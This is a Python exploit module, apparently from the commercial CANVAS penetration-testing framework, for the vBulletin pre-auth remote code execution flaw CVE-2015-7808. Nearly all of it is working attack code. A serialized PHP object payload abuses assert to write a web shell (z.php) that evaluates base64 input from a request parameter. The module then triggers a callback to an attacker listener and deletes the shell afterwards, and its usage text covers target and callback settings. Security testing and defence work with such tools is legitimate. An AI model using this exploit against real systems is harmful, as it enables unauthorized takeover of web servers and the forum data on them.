#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import logging

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
import urllib
import libs.spkproxy as spkproxy

from exploitutils import *
from ExploitTypes.phpexploit import *


NAME                            = "vBulletin pre-auth remote code execution"
DESCRIPTION                     = "vBulletin vB_Api_Hook::decodeArguments pre-auth code execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "vBulletin Solutions"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2015-7808"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7808"
DOCUMENTATION['References']     = ['http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/',
                                   'http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq']

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [["Linux" ], ["Windows"]]
PROPERTY['VERSION']             = ["All"]

DOCUMENTATION['NOTES'] = """

Tested on Ubuntu 14.04 against:
- vBulletin 5.1.4
- vBulletin 5.0.4
"""

CHANGELOG = """
"""


class theexploit(phpexploit):
    def __init__(self):
        phpexploit.__init__(self)
        self.port               = 80
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = "/"
        self.basepaths          = ["/vb5/", "/vb/", "/forum/"]

        self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.verb               = "GET"
        self.content_type       = "text/plain"
        self.targetpath         = "ajax/api/hook/decodeArguments"
        self.foundstrings       = ["vBulletin"]
        self.testfile           = "index.php"
        self.serialized_arg     = """arguments=O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:%d:"%s";}"""

        self.setVersions()
        return

    def geturlarguments(self):
        if self.command:
            logging.info("Using command: %s" % self.command)
            command = self.command
        else:
            code    = """<?php\nerror_reporting(0);print(___);eval(base64_decode($_REQUEST[\\'c\\']));die;?>"""
            command = """print ($f = fopen('./z.php', 'w')) . fwrite($f, '%s') . fclose($f);""" % code

        serialized_arg  = """arguments=O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:%d:"%s";}""" % (len(command), command)

        return quote(serialized_arg, safe="=").replace("%2A", "%00%2A%00")

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
        self.log("Using version: %s" % self.version)

        #
        # If we don't get a basepath argument we try to figure it out through
        # self.basepaths
        #
        if not self.basepath:
            ret = self.test()
            if not ret:
                self.setInfo("%s against %s:%d (failed: didn't find vulnerable target!)" % (self.name, self.host, self.port))
                self.log("Testing didn't find vulnerable target")
                return 0

        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d" % (self.host, self.port))
        self.log("Basic Auth User: %s" % self.basicauth_user)
        self.log("VHost: %s" % self.hostname)

        #setup our UA first
        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
        else:
            auth = None

        targetstring = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath
        self.ua = spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        if hasattr(self, "content_type"):
            self.ua.addHeader("Content-Type", self.content_type)

        # Testing may need to change if it mucks with anything..
        self.ua.addHeader("User-Agent", self.random_ua())

        noresponse = True
        if self.command:
            #we do get the response if we are sending it a command
            noresponse = False

        data = self.ua.GET(self.targetpath + "?" + self.geturlarguments(), noresponse=noresponse)

        if self.command and data:
            blah = self.parse_command_response(data)

        sleep(1)

        #
        # Time to trigger our php callback
        #
        cback = self.get_php_to_mosdef()
        cback = b64encode(cback).strip()
        t = "z.php?c=%s" % cback

        data = self.ua.GET(t, noresponse=noresponse)

        #
        # Wait 5 seconds for callback
        #
        for i in range(0, 5):
            ret = self.ISucceeded()
            if ret:
                break
            sleep(1)

        #
        # Cleanup
        #
        logging.warning("Performing cleanup")
        command = """unlink('./z.php');"""
        serialized_arg  = """arguments=O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:%d:"%s";}""" % (len(command), command)
        arg = quote(serialized_arg, safe="=").replace("%2A", "%00%2A%00")
        data = self.ua.GET(self.targetpath + "?" + arg)
        logging.warning("Cleanup DONE")

        self.setInfo("%s attacking %s:%d (DONE)" % (self.name, self.host, self.port))
        self.setProgress(100)

        return ret

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/vbulletin/ [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-O command: php code to run      [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
